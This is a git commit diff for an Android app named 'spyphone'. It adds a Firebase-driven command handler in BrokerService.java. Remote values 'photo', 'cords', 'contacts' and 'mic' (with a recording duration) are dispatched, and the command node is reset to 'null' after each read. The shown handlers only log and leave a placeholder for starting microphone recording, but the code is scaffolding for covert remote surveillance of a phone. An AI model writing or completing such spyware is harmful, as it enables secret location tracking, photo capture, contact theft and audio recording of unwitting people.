aa937c46b565b870fc39487dee8ee4bf87cf661a
Emil Makovac <emil.makovac@gmail.com>
2015-04-23 18:30:17 +0200

    Added functionality for reading actions.Actions that are added: cords, photo, contacts, mic. After the value has been read, it is updated with value 'null'

--- app/src/main/java/emit/esy/es/spyphone/BrokerService.java
+++ app/src/main/java/emit/esy/es/spyphone/BrokerService.java
@@ -60,12 +60,56 @@ public class BrokerService extends Service {
                 public void onChildAdded(DataSnapshot dataSnapshot, String s) {
                     String child = dataSnapshot.getValue().toString();
                     Log.d("ChildAdded", dataSnapshot.getKey() +" : "+child);
+
                 }
 
                 @Override
                 public void onChildChanged(DataSnapshot dataSnapshot, String s) {
-                    String child = dataSnapshot.getValue().toString();
+                    String child = dataSnapshot.getKey();
+
                     Log.d("ChildChanged", child);
+
+                    //check if androidRead has changed
+                    if(child.equals("androidRead")){
+                        //check if androidRead has a string or a map of strings as a value
+                        try{
+                            //if is a string
+                            String childValue = (String)dataSnapshot.getValue();
+                            switch (childValue){
+                                case "photo":
+                                    Log.d(LOG_TAG, "Starting photo service");
+                                    setOnDefaultAndroidRead(dataSnapshot);
+                                    break;
+                                case "cords":
+                                    Log.d(LOG_TAG, "Starting geo service");
+                                    setOnDefaultAndroidRead(dataSnapshot);
+                                    break;
+                                case "contacts":
+                                    Log.d(LOG_TAG, "Starting contacts service");
+                                    setOnDefaultAndroidRead(dataSnapshot);
+                                    break;
+                                default:
+                                    Log.d(LOG_TAG, "Wrong action, nothing to start. Value is " + childValue);
+                                    break;
+                            }
+                        } catch (Exception e){
+                            //if is a map of strings
+                            Map<String, Object> childValue;
+                            childValue = (Map<String, Object>) dataSnapshot.getValue();
+                            String action = childValue.get("action").toString();
+
+                            switch (action){
+                                case "mic":
+                                    long duration = (long) childValue.get("secondParam");
+                                    Log.d(LOG_TAG, "Starting mic service with duration " + Long.toString(duration) + " sec");
+                                    //create intent to start microphone recording service with duration of recording
+
+                                    setOnDefaultAndroidRead(dataSnapshot);
+                                    break;
+                            }
+                        }
+
+                    }
 
                 }
 
@@ -86,6 +130,11 @@ public class BrokerService extends Service {
             });
 
         }
+    }
+
+    private void setOnDefaultAndroidRead(DataSnapshot dataSnapshot) {
+        Log.d(LOG_TAG, "androidRead set to null");
+        dataSnapshot.getRef().setValue("null");
     }
 
     private String createUsername() {
@@ -149,14 +198,15 @@ public class BrokerService extends Service {
         userRef = ref.child(id);
         Map<String, Object> user = new HashMap<String, Object>();
         user.put("isOnline", b);
-        Map<String, Object> conn = new HashMap<String, Object>();
-        conn.put("isOnline", false);
+        user.put("androidRead", "null");
+        Map<String, Object> connOnline = new HashMap<String, Object>();
+        connOnline.put("isOnline", false);
         if(b){
            userRef.updateChildren(user);
-           userRef.onDisconnect().updateChildren(conn);
+           userRef.onDisconnect().updateChildren(connOnline);
         } else {
            userRef.setValue(user);
-           userRef.onDisconnect().updateChildren(conn);
+           userRef.onDisconnect().updateChildren(connOnline);
         }
     }
 
